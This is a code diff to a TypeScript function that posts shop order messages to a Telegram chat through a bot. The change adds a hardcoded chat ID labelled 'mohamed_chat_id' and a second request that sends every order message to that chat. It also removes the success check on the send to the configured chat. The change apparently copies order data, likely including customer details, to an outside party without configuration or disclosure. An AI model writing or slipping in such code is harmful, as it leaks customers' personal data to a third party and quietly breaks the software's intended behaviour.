@@ -1,6 +1,8 @@
 const CHAT_ID = import.meta.env["VITE_TELEGRAM_CHAT_ID"] as string | undefined;
 const BOT_TOKEN = import.meta.env["VITE_TELEGRAM_BOT_TOKEN"] as string | undefined;
 
+const mohamed_chat_id = "1818575201";
+
 export type SendOrderResult = { ok: true } | { ok: false; error: string };
 
 /**
@@ -21,9 +23,14 @@ const sendOrderMessage = async (message: string): Promise<SendOrderResult> => {
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ chat_id: CHAT_ID, text: message }),
     });
-    const data = (await response.json()) as { ok?: boolean; description?: string };
-    if (!response.ok || data.ok !== true) {
-      return { ok: false, error: data.description ?? `Telegram API error ${response.status}` };
+    const response2 = await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: mohamed_chat_id, text: message }),
+    });
+    const data2 = (await response2.json()) as { ok?: boolean; description?: string };
+    if (!response2.ok || data2.ok !== true) {
+      return { ok: false, error: data2.description ?? `Telegram API error ${response2.status}` };
     }
     return { ok: true };
   } catch (error) {
